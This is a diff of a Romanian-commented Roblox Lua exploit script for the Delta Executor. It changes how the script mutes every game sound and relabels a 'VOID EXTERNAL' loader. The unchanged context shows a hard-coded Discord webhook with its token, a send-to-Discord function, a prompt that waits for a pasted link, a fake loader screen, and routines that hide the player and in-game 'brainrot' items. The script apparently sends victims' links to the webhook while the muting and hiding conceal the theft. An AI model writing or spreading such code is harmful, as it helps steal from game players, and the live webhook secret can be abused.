@@ -1,5 +1,5 @@
--- SCRIPT DELTA - OPREȘTE ABSOLUT TOT (ULTRA-AGRESIV)
--- Compatibil cu Delta Executor
+-- SCRIPT DELTA - CU METODA CARE MERGE (oprește toate sunetele)
+-- Combinat cu VOID EXTERNAL + Discord
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -8,7 +8,6 @@ local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 local Workspace = game:GetService("Workspace")
 local CoreGui = game:GetService("CoreGui")
 local SoundService = game:GetService("SoundService")
-local RunService = game:GetService("RunService")
 
 local WEBHOOK = "https://discord.com/api/webhooks/1510999167244304554/kScJIW0h-ZUy0Aadhs936Y-8ZEAiTKnyewPvwbg6y7SrHHOwA5l4MotrcmGMBzzCy9gF"
 
@@ -26,109 +25,28 @@ local function sendToDiscord(message)
     end
 end
 
--- ===== OPREȘTE ABSOLUT TOT (ULTRA-AGRESIV) =====
-local function killAbsolutelyEverything()
-    print("🔇 Oprire ABSOLUT TOT...")
+-- ===== METODA CARE MERGE (de la aphisab/light) =====
+local function killAllAudio()
+    print("🔇 Oprire sunete (metoda care merge)...")
     
     -- 1. Oprește volumul global
-    pcall(function()
-        SoundService.Volume = 0
-    end)
+    SoundService.Volume = 0
     
-    -- 2. Oprește toate sunetele din JOC (inclusiv cele ascunse)
-    pcall(function()
-        for _, sound in pairs(game:GetDescendants()) do
-            if sound:IsA("Sound") then
-                sound.Volume = 0
-                sound:Stop()
-                sound.Playing = false
-            end
+    -- 2. Oprește toate sunetele existente
+    for _, v in ipairs(game:GetDescendants()) do
+        if v:IsA("Sound") then
+            v.Volume = 0
+        end
+    end
+    
+    -- 3. Oprește și sunetele create ulterior (ASTA E CHEIA!)
+    game.DescendantAdded:Connect(function(v)
+        if v:IsA("Sound") then
+            v.Volume = 0
         end
     end)
     
-    -- 3. Oprește sunetele din SoundService (inclusiv muzica de fundal)
-    pcall(function()
-        for _, sound in pairs(SoundService:GetDescendants()) do
-            if sound:IsA("Sound") then
-                sound.Volume = 0
-                sound:Stop()
-                sound.Playing = false
-            end
-        end
-        -- Setează volumul la 0 și pentru SoundService
-        SoundService.Volume = 0
-    end)
-    
-    -- 4. Oprește sunetele din fiecare jucător
-    pcall(function()
-        for _, player in pairs(Players:GetPlayers()) do
-            if player.Character then
-                for _, sound in pairs(player.Character:GetDescendants()) do
-                    if sound:IsA("Sound") then
-                        sound.Volume = 0
-                        sound:Stop()
-                        sound.Playing = false
-                    end
-                end
-            end
-        end
-    end)
-    
-    -- 5. Oprește sunetele din CoreGui (interfață)
-    pcall(function()
-        for _, gui in pairs(CoreGui:GetDescendants()) do
-            if gui:IsA("Sound") then
-                gui.Volume = 0
-                gui:Stop()
-                gui.Playing = false
-            end
-        end
-    end)
-    
-    -- 6. Oprește sunetele din LocalPlayer.PlayerGui
-    pcall(function()
-        for _, gui in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
-            if gui:IsA("Sound") then
-                gui.Volume = 0
-                gui:Stop()
-                gui.Playing = false
-            end
-        end
-    end)
-    
-    -- 7. BLOCEAZĂ ORICE SUNET NOU (loop SUPER-RAPID)
-    spawn(function()
-        while true do
-            task.wait(0.01)
-            pcall(function()
-                SoundService.Volume = 0
-                for _, sound in pairs(game:GetDescendants()) do
-                    if sound:IsA("Sound") then
-                        if sound.Volume > 0 or sound.Playing == true then
-                            sound.Volume = 0
-                            sound:Stop()
-                            sound.Playing = false
-                        end
-                    end
-                end
-            end)
-        end
-    end)
-    
-    -- 8. DISTRUGERE DIRECTĂ a obiectelor care produc sunete (opțional)
-    pcall(function()
-        local toDestroy = {}
-        for _, obj in pairs(Workspace:GetDescendants()) do
-            if obj:IsA("Sound") then
-                table.insert(toDestroy, obj)
-            end
-        end
-        for _, sound in pairs(toDestroy) do
-            sound:Destroy()
-        end
-    end)
-    
-    print("✅ ABSOLUT TOT a fost oprit!")
+    print("✅ Toate sunetele oprite (metoda care merge)!")
 end
 
 -- ===== ASCUNDE BRAINROT-URILE =====
@@ -143,7 +61,6 @@ local function hideBrainrots()
                 for _, sound in pairs(obj:GetDescendants()) do
                     if sound:IsA("Sound") then
                         sound.Volume = 0
-                        sound:Stop()
                     end
                 end
                 table.insert(hidden, obj)
@@ -194,7 +111,7 @@ local function hideMe()
     end
 end
 
--- ===== LOADER =====
+-- ===== LOADER (VOID EXTERNAL) =====
 local function showLoader()
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "LoaderGUI"
@@ -520,7 +437,7 @@ local function showLinkGUI()
             gui:Destroy()
             showLoader()
             hideMe()
-            killAbsolutelyEverything()
+            killAllAudio()
             local count = hideBrainrots()
             print("✅ Script active! " .. count .. " brainrots hidden.")
             spawn(function()
@@ -539,7 +456,7 @@ local function main()
     showLinkGUI()
     print("🚀 Waiting for link input...")
     print("🔄 Base resets every 5 seconds.")
-    print("🔇 ABSOLUTELY EVERYTHING is OFF!")
+    print("🔇 All sounds OFF (method from aphisab/light)!")
 end
 
 pcall(main)
